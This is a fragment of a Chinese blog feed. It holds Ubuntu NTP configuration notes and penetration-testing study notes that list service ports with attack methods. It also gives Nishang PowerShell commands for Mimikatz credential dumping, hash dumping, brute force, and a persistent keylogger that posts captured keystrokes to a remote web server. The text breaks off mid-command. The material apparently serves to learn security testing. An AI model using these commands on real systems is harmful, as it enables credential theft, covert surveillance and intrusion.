server-网络相关知识/20200308154004613_29225.png"></p><h6 id="NTP客户端"><a href="#NTP客户端" class="headerlink" title="NTP客户端"></a>NTP客户端</h6><ul><li>客户端程序从时间服务器同步时间</li><li>系统启动时自动同步时间</li><li>网口激活时自动同步运行</li><li>手动同步时间</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新版系统，查看客户端时间</span></span><br><span class="line">timedatectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># RTC时间：硬件时间</span></span><br></pre></td></tr></table></figure><p>新版系统使用<code>timesyncd</code>客户端同步时间<br>向这个域名请求：ntp.ubuntu.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">timedatectrl list-timezones   <span class="comment">#列出所有时区</span></span><br><span class="line">timedatectrl <span class="built_in">set</span>-timezone    <span class="comment">#设置时区</span></span><br><span class="line">timedatectrl <span class="built_in">set</span>-time <span class="string">"2019-10-01 18:18:18"</span> <span class="comment">#设置系统时间</span></span><br><span class="line"></span><br><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span>  <span class="comment">#开始网络同步</span></span><br><span class="line">systemctl status systemd-timesyncd.service  <span class="comment"># 查看时间服务状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 硬件时间(RTC)与UTC时间同步</span></span><br><span class="line">sudo hwclock -w   <span class="comment"># 将系统时间写入到RTC时间</span></span><br><span class="line">sudo hwlock -s     <span class="comment"># 将硬件</span></span><br><span class="line">hwclock --<span class="built_in">set</span> --date=<span class="string">'2019-10-01 18:18:18'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/systemd/timesyncd.conf</span><br></pre></td></tr></table></figure><h6 id="一个过时的东西-ntpdate"><a href="#一个过时的东西-ntpdate" class="headerlink" title="一个过时的东西(ntpdate)"></a>一个过时的东西(ntpdate)</h6><p><img src="/ubuntu server-网络相关知识/20200308170606501_6440.png"><br>新版本系统使用<code>timesyncd</code>替换<code>ntpd</code>的客户端功能<br>一旦安装了ntpdate / ntp,   timedatectrl将被禁用</p><h6 id="ntpd-–-客户端-服务器"><a href="#ntpd-–-客户端-服务器" class="headerlink" title="ntpd – 客户端+服务器"></a>ntpd – 客户端+服务器</h6><blockquote><p>把机器设置成时间服务器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt install ntp  <span class="comment"># 安装ntp服务</span></span><br><span class="line">systemctl start ntp  <span class="comment"># 启动服务(123端口就被打开了)</span></span><br><span class="line">systemctl status ntp  <span class="comment"># 查询服务状态</span></span><br><span class="line">systemctl restart ntp  <span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##配置文件（我也要跟上一级的时间服务器同步）</span></span><br><span class="line">vim /etc/ntp.conf</span><br><span class="line"><span class="comment">#如果不使用官方的时间服务器，可以自己指定</span></span><br><span class="line">server 1.1.1.1</span><br><span class="line"><span class="comment">#首选网络时间服务器不可用的时候，使用本机始终作为备用时间源</span></span><br><span class="line">fudge 127.127.1.1 startum 10  <span class="comment"># 层级设置低点( startum 10, 这里设置为10层)</span></span><br></pre></td></tr></table></figure></p></blockquote><p>配置文件中，主要的时间服务器如下<br><img src="/ubuntu server-网络相关知识/20200308171832987_9157.png"></p><h6 id="命令-ntpq-–-ntp服务端的查询命令"><a href="#命令-ntpq-–-ntp服务端的查询命令" class="headerlink" title="命令: ntpq – ntp服务端的查询命令"></a>命令: ntpq – ntp服务端的查询命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntpq -p   </span><br><span class="line"><span class="comment">#命令执行结果详解如下图：</span></span><br></pre></td></tr></table></figure><p><img src="/ubuntu server-网络相关知识/20200308172254102_12604.png"><br>每行前面第一个字符含义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空  表示无效主机</span><br><span class="line">x   已不再使用</span><br><span class="line">-   已不再使用</span><br><span class="line">#   状态良好但为使用</span><br><span class="line">+   良好且优先使用</span><br><span class="line">*   首选主同步主机    （一般是startum层级最高的）</span><br></pre></td></tr></table></figure><h6 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看日期</span></span><br><span class="line">date</span><br><span class="line"><span class="comment">#设置</span></span><br><span class="line">date --<span class="built_in">set</span> 1998-11-11  <span class="comment">#手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp）</span></span><br><span class="line">date --<span class="built_in">set</span> 21:21:21    <span class="comment">#设置时间</span></span><br><span class="line"></span><br><span class="line">cat /etc/timezone      <span class="comment">#查看时区</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网络原理&quot;&gt;&lt;a href=&quot;#网络原理&quot; class=&quot;headerlink&quot; title=&quot;网络原理&quot;&gt;&lt;/a&gt;网络原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/ubuntu server-网络相关知识/20200214100233476_240785919.pn
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="http://www.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://www.xpshuai.cn/内网渗透/</id>
    <published>2020-03-05T04:23:24.000Z</published>
    <updated>2020-03-05T05:19:50.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网分类："><a href="#内网分类：" class="headerlink" title="内网分类："></a>内网分类：</h1><ul><li><p>带域环境的内网</p></li><li><p>不带域环境的内网</p></li></ul><h1 id="一些端口"><a href="#一些端口" class="headerlink" title="一些端口"></a>一些端口</h1><h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><blockquote><p>比如学校机房有专门用来下载文件的服务器</p></blockquote><h4 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h4><p><strong>FTP服务：</strong> ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；<br><strong>默认端口：</strong>20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><h6 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块；</li><li>匿名访问：用户名：anonymous 密码：为空或任意邮箱</li></ul><h4 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h4><p><strong>Samba服务：</strong>对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。<br>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p><h6 id="攻击方式：-1"><a href="#攻击方式：-1" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P</li><li>PassFile IP smb</li><li>未授权访问：给予public用户高权限</li><li>远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等</li></ul><h4 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h4><p><strong>ldap：</strong>轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。<br>默认端口：389</p><h6 id="攻击方式：-2"><a href="#攻击方式：-2" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>注入攻击盲注 </li><li>未授权访问</li><li>爆破：弱口令</li></ul><h3 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h3><h4 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h4><p><strong>SSH服务：</strong>  这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。<br><strong>默认端口：</strong>    22</p><h6 id="攻击方式：-3"><a href="#攻击方式：-3" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：</li><li>弱口令</li><li>漏洞：28退格漏洞、OpenSSL漏洞</li></ul><h4 id="Telent服务"><a href="#Telent服务" class="headerlink" title="Telent服务"></a>Telent服务</h4><p><strong>Telnet服务：</strong>在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；<br><strong>默认端口：</strong>  23</p><h6 id="攻击方式：-4"><a href="#攻击方式：-4" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>嗅探：此种情况一般发生在局域网</li></ul><h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><p><strong>远程桌面连接：</strong>作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；<br><strong>默认端口：</strong>  3389</p><h6 id="攻击方式：-5"><a href="#攻击方式：-5" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块)</li><li>Shift粘滞键后门：5次shift后门</li><li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_…，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids）</li></ul><h4 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h4><p><strong>VNC服务:</strong>    一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也<br><strong>默认端口：</strong>5900+桌面ID（5901；5902）</p><h6 id="攻击方式：-6"><a href="#攻击方式：-6" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>认证口令绕过：</li><li>拒绝服务攻击：（CVE-2015-5239）</li><li>权限提升：（CVE-2013-6886）</li></ul><h4 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h4><p>… … </p><h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><h4 id="1-中间件平台渗透"><a href="#1-中间件平台渗透" class="headerlink" title="1.中间件平台渗透"></a>1.中间件平台渗透</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IIS Apache Nginx Weblogic tomcat Jboos Websphere等</span><br><span class="line"># 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF`</span><br></pre></td></tr></table></figure><h4 id="2-WEB应用程序渗透"><a href="#2-WEB应用程序渗透" class="headerlink" title="2.WEB应用程序渗透"></a>2.WEB应用程序渗透</h4><ul><li><p>已知CMS </p></li><li><p>未知CMS </p></li><li><p>常规漏洞测试</p></li></ul><h3 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h3><p>针对所有的    数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p><h4 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h4><p><strong>默认端口：</strong> 3306</p><h6 id="攻击方式：-7"><a href="#攻击方式：-7" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>身份认证漏洞：CVE-2012-2122</li><li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li><li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</li></ul><h4 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h4><p><strong>默认端口：</strong>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p><h6 id="攻击方式：-8"><a href="#攻击方式：-8" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li></ul><h4 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h4><p><strong>默认端口：</strong>1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p><h6 id="攻击方式：-9"><a href="#攻击方式：-9" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：弱口令</li><li>漏洞攻击</li></ul><h4 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h4><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br><strong>默认端口：</strong> 5432</p><h6 id="攻击方式：-10"><a href="#攻击方式：-10" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破弱口令：postgres postgres</li><li>缓冲区溢出：CVE-2014-2669</li></ul><h4 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h4><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考<br><strong>默认端口：</strong>  27017</p><h6 id="攻击方式：-11"><a href="#攻击方式：-11" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令 </p></li><li><p>未授权访问</p></li></ul><h4 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h4><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><p>Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547<br><strong>默认端口：</strong>  6379</p><h6 id="攻击方式：-12"><a href="#攻击方式：-12" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令 </p></li><li><p>未授权访问+配合ssh key提权</p></li></ul><h4 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h4><p><strong>默认端口：</strong>服务端口5000；监听端口4100；备份端口：4200</p><h6 id="攻击方式：-13"><a href="#攻击方式：-13" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>爆破：</li><li>弱口令;</li><li>命令注入</li></ul><h4 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h4><p><strong>默认端口：</strong>5000</p><h6 id="攻击方式：-14"><a href="#攻击方式：-14" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li></ul><p><strong>总结一下：</strong>对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p><h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h4 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h4><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！<br><strong>默认端口：</strong>  25（smtp）、465（smtps）</p><h6 id="攻击方式：-15"><a href="#攻击方式：-15" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破：弱口令</p></li><li><p>未授权访问</p></li></ul><h4 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h4><p><strong>默认端口：</strong> 109（POP2）、110（POP3）、995（POP3S）</p><h6 id="攻击方式：-16"><a href="#攻击方式：-16" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破弱口令</p></li><li><p>未授权访问</p></li></ul><h4 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h4><p><strong>默认端口：</strong>143（imap）、993（imaps）</p><h6 id="攻击方式：-17"><a href="#攻击方式：-17" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li><p>爆破：弱口令</p></li><li><p>配置不当</p></li></ul><h3 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h3><h4 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h4><p><strong>默认端口：</strong> 53</p><h6 id="攻击方式：-18"><a href="#攻击方式：-18" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>区域传输漏洞</li></ul><h4 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h4><p><strong>默认端口：</strong>67&amp;68、546（DHCP Failover做双机热备的）</p><h6 id="攻击方式：-19"><a href="#攻击方式：-19" class="headerlink" title="攻击方式："></a>攻击方式：</h6><ul><li>DHCP劫持</li></ul><h4 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h4><p><strong>默认端口：</strong> 161<br>攻击方式:</p><ul><li>爆破弱口令</li></ul><hr><h1 id="Powershell框架"><a href="#Powershell框架" class="headerlink" title="Powershell框架"></a>Powershell框架</h1><blockquote><p>推荐使用 NiShang</p></blockquote><blockquote><p>参考文章：<a href="https://www.4hou.com/posts/E99ml" target="_blank" rel="noopener">https://www.4hou.com/posts/E99ml</a></p></blockquote><blockquote><p>下载地址: <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p></blockquote><blockquote><p>各种命令解析： <a href="https://www.explainshell.com" target="_blank" rel="noopener">https://www.explainshell.com</a></p></blockquote><h4 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h4><p>nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级）</p><ul><li>powershell ISE是一个编译器</li><li>powershell有很多渗透框架：</li><li>PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异</li></ul><blockquote><p>实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要</p></blockquote><h4 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h4><p><img src="/内网渗透/目录.png"></p><h4 id="模块和功能介绍："><a href="#模块和功能介绍：" class="headerlink" title="模块和功能介绍："></a>模块和功能介绍：</h4><p><img src="/内网渗透/功能.png"></p><h4 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h4><p>端口扫描 密码获取 键盘记录 反弹会话 口令爆破</p><h4 id="实战应用："><a href="#实战应用：" class="headerlink" title="实战应用："></a>实战应用：</h4><ul><li>后续控制</li><li>域渗透</li><li>系统提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"># 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）</span><br><span class="line"></span><br><span class="line">Import-Module .nishang.psml</span><br><span class="line"></span><br><span class="line"># 载入模块  查看NiShang都有哪些模块</span><br><span class="line"></span><br><span class="line">Get-Command -Moudle nishang</span><br><span class="line"></span><br><span class="line">## 查看机器基本信息</span><br><span class="line"></span><br><span class="line">Get-Information</span><br><span class="line"></span><br><span class="line"># 把结果导出文件  Out-File</span><br><span class="line"></span><br><span class="line">Get-Information | Out-File res.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测是否为虚拟机</span><br><span class="line"></span><br><span class="line">Check-VM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 获取密码</span><br><span class="line"></span><br><span class="line">Invoke-Minikatz</span><br><span class="line">#Dump出本机的凭证信息</span><br><span class="line">Invoke-Minikatz -DumpCerts</span><br><span class="line">#dump出远程的两台计算机的凭证信息</span><br><span class="line">Invoke-Minikatz -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)</span><br><span class="line">#在远程的一台机器上运行Mimikatz 并执行 &quot;privilege::debug exit&quot;</span><br><span class="line">Invoke-Minikatz -Command &quot;privilege::debug exit&quot; -ComputerName@(&quot;computer1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Get-PassHashes 获取密码</span><br><span class="line"></span><br><span class="line"># 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）</span><br><span class="line"></span><br><span class="line">Get-PassHashes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率</span><br><span class="line"></span><br><span class="line">Get-PassHints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 获取帮助参数  Get-Help</span><br><span class="line"></span><br><span class="line">Get-Help Invoke-PortScan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 端口扫描</span><br><span class="line"></span><br><span class="line">查看帮助信息</span><br><span class="line">Get-Help Invoke-PortScan -full</span><br><span class="line">Invoke-PortScan</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cd 切换到对应目录</span><br><span class="line"></span><br><span class="line">## 测试键盘记录:  </span><br><span class="line"></span><br><span class="line">Get-Help .\Keylogger.ps1 --full   # 查看帮助（提供了四种方式记录）</span><br><span class="line">#-URL 要把记录发Keylogger送到的置顶的远程服务器    ,    -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录</span><br><span class="line">.\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php </span><br><span class="line"></span><br><span class="line"># 解释： 将记录指定发送给一个可以记录Post请求的Web服务器</span><br><span class="line"></span><br><span class="line"># 默认保存到(内容是ascii码)： Windows/Temp/key.log</span><br><span class="line"></span><br><span class="line"># 把ascii记录解析为非ascii：</span><br><span class="line"></span><br><span class="line">Parse_Keys .\key.log .\parsed.txt</span><br><span class="line"></span><br><span class="line"># 持久化记录（重启之后也记录）</span><br><span class="line"></span><br><span class="line">.\Keylogger.ps1 -persist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 爆破口令  在scan目录下面</span><br><span class="line"></span><br><span class="line">#用于对SQL Server、域控制器、Web和FTP弱口令爆破</span><br><span class="line">Invoke-BruteForce</span><br><span class="line">#命令参数如下</span><br><span class="line">-ComputerName    # 对应服务的计算机名</span><br><span class="line">-UserList  用户名字典</span><br><span class="line">-PasswordList  密码字典</span><br><span class="line">-Service 服务（默认为：SQL）</span><br><span class="line">-StopOnSuccess   匹配一个后停止</span><br><span class="line">-Delay    延迟时间</span><br><span class="line">#比如</span><br><span class="line">Invoke-BruteForce 